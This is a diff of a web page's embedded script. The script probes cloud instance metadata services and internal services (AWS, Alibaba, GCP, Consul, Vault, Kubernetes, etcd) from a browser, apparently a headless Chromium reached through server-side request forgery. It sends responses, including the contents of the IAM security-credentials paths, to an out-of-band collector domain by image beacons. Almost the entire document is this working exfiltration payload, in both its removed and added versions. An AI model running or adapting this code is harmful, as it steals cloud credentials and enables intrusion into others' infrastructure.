@@ -7,53 +7,49 @@ var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
 var T0 = Date.now();
 
 function fire(path) {
-  new Image().src = 'https://' + OOB + path + '&_=' + Math.random();
-  fetch('https://' + OOB + path, {mode:'no-cors'}).catch(function(){});
+  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
 }
 
-// Heartbeat every 300ms - tells us how long Chromium keeps the page alive
-var hbN = 0;
-var hbTimer = setInterval(function() {
-  hbN++;
-  fire('/hb?n=' + hbN + '&ms=' + (Date.now() - T0));
-}, 300);
-setTimeout(function(){ clearInterval(hbTimer); }, 20000);
+// Alive
+fire('/alive2?ms=0&ua=' + encodeURIComponent(navigator.userAgent.slice(0, 80)));
 
-// Alive beacon
-fire('/alive?ua=' + encodeURIComponent(navigator.userAgent.slice(0, 100)));
-
-// All IMDS probes fired in parallel, no await chain
-var probes = [
-  ['aws',     'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {}],
-  ['aws-tok', 'http://169.254.169.254/latest/api/token', {method:'PUT', headers:{'X-aws-ec2-metadata-token-ttl-seconds':'21600'}}],
-  ['ali',     'http://100.100.100.200/latest/meta-data/', {}],
-  ['ali-cred','http://100.100.100.200/latest/meta-data/ram/security-credentials/', {}],
-  ['gcp',     'http://metadata.google.internal/computeMetadata/v1/project/project-id', {headers:{'Metadata-Flavor':'Google'}}],
-  ['gcp-sa',  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/', {headers:{'Metadata-Flavor':'Google'}}],
-  ['yc',      'http://169.254.169.254/latest/meta-data/', {headers:{'Metadata-Flavor':'Yandex'}}],
-  ['consul',  'http://127.0.0.1:8500/v1/catalog/services', {}],
-  ['vault',   'http://127.0.0.1:8200/v1/sys/health', {}],
-  ['k8s',     'https://kubernetes.default.svc/api/', {}],
-  ['etcd',    'http://127.0.0.1:2379/version', {}],
+// 169.254.169.254 focused probes — short timeout 80ms to fit in page lifetime
+var ll_targets = [
+  ['imds-root',  'http://169.254.169.254/'],
+  ['imds-meta',  'http://169.254.169.254/latest/meta-data/'],
+  ['imds-iam',   'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
+  ['imds-yc',    'http://169.254.169.254/computeMetadata/v1/project/project-id'],
+  ['imds-169',   'http://169.254.169.254/openstack/latest/meta_data.json'],
 ];
 
-probes.forEach(function(p) {
-  var label = p[0], url = p[1], opts = p[2];
+ll_targets.forEach(function(t) {
+  var label = t[0], url = t[1];
   var t0 = Date.now();
-  var fetchOpts = {signal: AbortSignal.timeout(5000)};
-  if (opts.method) fetchOpts.method = opts.method;
-  if (opts.headers) fetchOpts.headers = opts.headers;
-
-  fetch(url, fetchOpts)
+  fetch(url, {signal: AbortSignal.timeout(80)})
     .then(function(r) {
       return r.text().then(function(body) {
-        fire('/ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0,300)));
+        fire('/OK-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 400)));
       });
     })
     .catch(function(e) {
-      fire('/err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0,100)));
+      fire('/err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0,80)));
     });
 });
+
+// Also try XHR (different PNA handling than fetch in some Chromium builds)
+var xhr = new XMLHttpRequest();
+xhr.timeout = 80;
+xhr.onload = function() {
+  fire('/OK-xhr-imds?ms=' + (Date.now()-T0) + '&s=' + xhr.status + '&d=' + encodeURIComponent(xhr.responseText.slice(0,400)));
+};
+xhr.onerror = function() {
+  fire('/err-xhr-imds?ms=' + (Date.now()-T0) + '&e=error');
+};
+xhr.ontimeout = function() {
+  fire('/err-xhr-imds?ms=' + (Date.now()-T0) + '&e=timeout');
+};
+xhr.open('GET', 'http://169.254.169.254/latest/meta-data/');
+xhr.send();
 </script>
 </body>
 </html>
